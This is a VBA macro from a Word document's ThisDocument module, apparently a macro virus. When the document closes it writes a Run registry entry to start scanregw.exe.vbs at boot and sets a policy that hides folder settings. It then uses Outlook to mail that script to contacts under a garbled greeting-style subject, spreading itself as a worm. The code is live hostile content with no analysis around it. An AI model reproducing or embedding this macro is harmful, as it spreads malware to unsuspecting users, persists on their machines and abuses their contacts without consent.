   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   On Error Resume Next
   Set fs = CreateObject("Scripting.FileSystemObject")
   Set dir1 = fs.GetSpecialFolder(0)
   Set dir2 = fs.GetSpecialFolder(1)
   Set so = CreateObject("Scripting.FileSystemObject")
   Dim r
   Set r = CreateObject("Wscript.Shell")
   r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\×¢²á±í×Ô¶¯±¸·Ý", "scanregw.exe.vbs"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders", 1, "REG_DWORD"
   Set ol = CreateObject("Outlook.Application")
   On Error Resume Next
   For x = 1 To 2
   Set Mail = ol.CreateItem(0)
   Mail.to = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
   Mail.Subject = "ÐÂÄê¿ìÀÖ£¡"
   Mail.Body = "ÐÂÄê¿ìÀÖ¡¢×£ÄúºÃÔË£¡            ¶ÀÐÐÕß"
   Mail.Attachments.Add (dir2 & ("scanregw.exe.vbs"))
   Mail.Send
   Next
   ol.Quit
   End Sub

   Private Sub Document_New()

   End Sub
